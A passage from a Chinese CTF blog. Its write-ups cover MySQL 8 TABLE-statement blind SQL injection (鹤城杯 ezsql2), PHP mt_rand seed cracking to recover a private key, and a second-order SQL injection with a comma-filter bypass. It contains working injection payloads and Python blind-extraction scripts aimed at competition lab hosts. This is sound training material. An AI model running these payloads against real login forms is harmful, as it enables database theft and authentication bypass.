<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="多条-VALUES-联合-UNION-ALL"><a href="#多条-VALUES-联合-UNION-ALL" class="headerlink" title="多条 VALUES 联合 UNION ALL"></a>多条 VALUES 联合 UNION ALL</h3><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8) union all values \</span><br><span class="line">    row(-1,-2,0),row(10,29,30),row(100,20,-9);</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">|       -1 |       -2 |        0 |</span><br><span class="line">|       10 |       29 |       30 |</span><br><span class="line">|      100 |       20 |       -9 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="根据字段下标排序，从1开始的多条values联合union-all-values"><a href="#根据字段下标排序，从1开始的多条values联合union-all-values" class="headerlink" title="根据字段下标排序，从1开始的多条values联合union all values"></a>根据字段下标排序，从1开始的多条values联合union all values</h3><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8) union all values \</span><br><span class="line">    row(-1,-2,0),row(10,29,30),row(100,20,-9) order by 1 desc ;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|      100 |       20 |       -9 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">|       10 |       29 |       30 |</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       -1 |       -2 |        0 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="实例-鹤城杯ezsql2"><a href="#实例-鹤城杯ezsql2" class="headerlink" title="实例(鹤城杯ezsql2)"></a>实例(鹤城杯ezsql2)</h2><p>那时我的想法是使用异或注入，但是发现重要的select被过滤掉了，然后发现mysql版本是8以上，所以可以使用table语句来绕过select过滤</p>
<p>爆数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admn&#x27;||(ascii(substr(database(),1,1))=32)#</span><br></pre></td></tr></table></figure>
<p>爆出数据库为ctf</p>
<p>爆数据表，我们知道数据表的信息一般存储在information_schema.tables中，所以我们可以使用table语句来读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;/**/and/**/ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)&gt;(TABLE/**/information_schema.tables/**/order/**/by/**/database_name/**/limit/**/1,1)#</span><br></pre></td></tr></table></figure>
<p>由于infoemation_schema.tables被过滤掉了，所以可以使用mysql.innodb_table_stats来读取数据表的信息，其中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)</span><br></pre></td></tr></table></figure>
<p>意思是每条列的第一行进行比较，从而爆出ctf库中的数据表有哪些，爆出数据表为f11114g</p>
<p>爆数据表中的信息，可以利用mysql8新增的特性table语句来构造盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#x27;and/**/substr((table/**/f11114g/**/limit/**/1,1),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;#</span><br></pre></td></tr></table></figure>


<p>所以我们可以写exp</p>
<p>爆数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">pt = &#x27;&#123;&#125;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-+[]?&lt;&gt;@!#$%^&amp;*~&#x27;</span><br><span class="line">url=&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">sql=&quot;user()&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def blindequ(start,end):</span><br><span class="line">    ret=&quot;&quot;</span><br><span class="line">    for i in range(start,end):</span><br><span class="line">        for ch in pt:</span><br><span class="line">            payload=&quot;admn&#x27;||(substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27;)#&quot;.format(sql,i,ch)</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;:payload,</span><br><span class="line">                &quot;password&quot;:&#x27;a&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            #print data</span><br><span class="line">            #req=requests.post(url,data=data,allow_redirects=False)</span><br><span class="line">            req=requests.post(url+&quot;/login.php&quot;,data=data)</span><br><span class="line">            #print req.text</span><br><span class="line">            #if req.status_code!=200 and req.status_code!=302:</span><br><span class="line">            #    continue </span><br><span class="line">            if  &quot;password error!&quot; in req.text:</span><br><span class="line">                ret=ret+ch</span><br><span class="line">                sys.stdout.write(&quot;[-]&#123;0&#125; Result : -&gt; &#123;1&#125; &lt;-\r&quot;.format(threading.current_thread().name,ret))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                break</span><br><span class="line">    print(threading.current_thread().name+&quot;[+]Result : -&gt;&quot;+ret+&quot;&lt;-&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">blindequ(1,20)</span><br></pre></td></tr></table></figure>

<p>爆数据表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">import binascii</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">url = &quot;http://182.116.62.85:26571/login.php&quot;</span><br><span class="line">def trans(a):</span><br><span class="line">    a = binascii.b2a_hex(a.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    return &#x27;0x&#x27;+str(a,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(1,500): </span><br><span class="line">    hexstr = &#x27;&#x27;</span><br><span class="line">    for char in range(32, 126):</span><br><span class="line">        hexstr = trans(flag+ chr(char))</span><br><span class="line">        #fl11aag</span><br><span class="line">        payload = &quot;admin&#x27;/**/and/**/ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)&gt;(TABLE/**/mysql.innodb_table_stats/**/order/**/by/**/database_name/**/limit/**/1,1)#&quot;.format(hexstr)</span><br><span class="line">        #payload = &quot;admin&#x27;/**/and/**/(&#123;&#125;)=&gt;binary(TABLE/**/ctf.fl11aag/**/limit/**/1,1)#&quot;.format(hexstr)</span><br><span class="line">        datas = &#123;&quot;username&quot;:payload,&quot;password&quot;:&quot;admin&quot;&#125;</span><br><span class="line">        r = req.post(url,data=datas)</span><br><span class="line">        if(&quot;login success&quot; in r.text):</span><br><span class="line">            flag = flag + chr(char-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>最后读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://139.129.98.9:30003/login.php&#x27;</span><br><span class="line">payload = &#x27;admin\&#x27;and/**/substr((table/**/f11114g/**/limit/**/1,1),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;#&#x27;</span><br><span class="line">passa=&#x27;123&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for j in range(1,500):</span><br><span class="line">    for i in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        py = payload.format(j,i)</span><br><span class="line">        post_data = &#123;&#x27;username&#x27;: py,&#x27;password&#x27;:passa&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        if &#x27;password&#x27; in re.text:</span><br><span class="line">            result += i</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>参考文章：[<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247483781&amp;idx=1&amp;sn=1cdb501787ea1c4bdbbe269b055f264c&amp;chksm=c01a86b3f76d0fa579033988aa71990448ff48e27e3def9feac994b81d9b1e3e7f6740188533&amp;mpshare=1&amp;scene=23&amp;srcid=1014L5fi7dWAaVU0EiVOulsW&amp;sharer_sharetime=1634199160117&amp;sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd]">https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247483781&amp;idx=1&amp;sn=1cdb501787ea1c4bdbbe269b055f264c&amp;chksm=c01a86b3f76d0fa579033988aa71990448ff48e27e3def9feac994b81d9b1e3e7f6740188533&amp;mpshare=1&amp;scene=23&amp;srcid=1014L5fi7dWAaVU0EiVOulsW&amp;sharer_sharetime=1634199160117&amp;sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd]</a></p>
<pre><code>[https://www.crisprx.top/archives/203]

[https://zhuanlan.zhihu.com/p/116632771]
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-伪随机数以及文件泄露" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" class="article-date">
  	<time datetime="2021-10-13T16:00:00.000Z" itemprop="datePublished">2021-10-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/">
        伪随机数以及文件泄露
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="伪随机数以及文件泄露"><a href="#伪随机数以及文件泄露" class="headerlink" title="伪随机数以及文件泄露"></a>伪随机数以及文件泄露</h1><p>打开页面，发现没有什么提示信息，所以用dirsearch去扫描，发现有文件泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.zip</span><br></pre></td></tr></table></figure>
<p>打开源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#x27;Content-type:text/html; charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;login&#x27;]))&#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    $Private_key = $_POST[&#x27;Private_key&#x27;];</span><br><span class="line">    if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123;</span><br><span class="line">        // 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    else if($Private_key != &#x27;*************&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if($Private_key === &#x27;************&#x27;)&#123;</span><br><span class="line">        $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; </span><br><span class="line">        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">        mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">// genarate public_key </span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></pre></td></tr></table></figure>
<p>从源码中，我们发现一个登录界面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&#x27;refresh:2; url=login.html&#x27;);</span><br></pre></td></tr></table></figure>
<p>我们尝试构造/login.html，然后登录，发现它需要用户名，密码和私钥，而从源码中，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span><br></pre></td></tr></table></figure>
<p>所以我们可以知道用户名为crispr，密码我们可以构造万能钥匙1’or ‘1=1绕过，而对于私钥，我们知道公钥是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Public_key = KVQP0LdJKRaV3n9D</span><br></pre></td></tr></table></figure>
<p>所以我们可以使用爆破的方式获取种子，从而得到私钥</p>
<p>首先我们要获取爆破种子的参数值，exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">key=&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br><span class="line">m=&#x27;&#x27;</span><br><span class="line">for i in key:</span><br><span class="line">    for j in range(len(s)):</span><br><span class="line">        if i==s[j]:</span><br><span class="line">            m+=&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;.format(j,j,len(s)-1)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure>
<p>然后我们使用php_mt_seed来对种子进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1775196155</span><br></pre></td></tr></table></figure>
<p>然后我们就可以得到私钥，exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(1775196155);</span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  //genarate private_key</span><br><span class="line">function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">echo public_key() . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo private_key();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到私钥为XuNhoueCDCGc，然后登录即可得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-逗号的绕过以及二次注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/13/%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" class="article-date">
  	<time datetime="2021-10-12T16:00:00.000Z" itemprop="datePublished">2021-10-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/13/%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">
        逗号的绕过以及二次注入
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="逗号绕过以及二次注入"><a href="#逗号绕过以及二次注入" class="headerlink" title="逗号绕过以及二次注入"></a>逗号绕过以及二次注入</h1><p>我们打开页面，发现只有一个登录页面，尝试进行sql闭合测试，发现失败，所以用dirsearch扫描目录，发现有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register.php、index.php以及login.php</span><br></pre></td></tr></table></figure>
<p>所以猜测可能是二次注入，即在register.php页面注册，写入sql语句，程序会将它写入存入数据库中，然后在login.php页面登录时会从数据库中刚刚写入的sql语句，并进行读取，然后回显，所以我们可以测试一下，在register.php页面构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username：0&#x27;and &#x27;1</span><br></pre></td></tr></table></figure>
<p>然后在login.php页面登录后，发现有回显0，所以证明是二次注入，然后经过测试，发现information_schema被过滤，而且逗号也被过滤，所以我们可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0;</span><br></pre></td></tr></table></figure>
<p>来绕过逗号，其中+在sql语言中是运算符，而from 1 for 1，意思是在字符串中的第一个位置取出一个字符出来，相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(database(),1,1))</span><br></pre></td></tr></table></figure>
<p>而对于information_schema的过滤，我们可以猜测flag在flag表中，所以我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;+ascii(substr((select * from flag) from 1 for 1))+&#x27;0;</span><br></pre></td></tr></table></figure>
<p>来读取flag，所以exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">def search():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/&#x27;</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    for i in range(100):</span><br><span class="line">        sleep(0.3)#不加sleep就429了QAQ</span><br><span class="line">        data1 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot; : &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        data2 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;,r2.text)</span><br><span class="line">        res1 = re.search(r&#x27;\d+&#x27;, res.group())</span><br><span class="line">        flag = flag+chr(int(res1.group()))</span><br><span class="line">        print(flag)</span><br><span class="line">    print(&quot;final:&quot;+flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    search()</span><br></pre></td></tr></table></figure>



      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-pop链3之__get()和__call()魔术方法的使用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/13/pop%E9%93%BE3%E4%B9%8B__get()%E5%92%8C__call()%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
  	<time datetime="2021-10-12T16:00:00.000Z" itemprop="datePublished">2021-10-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
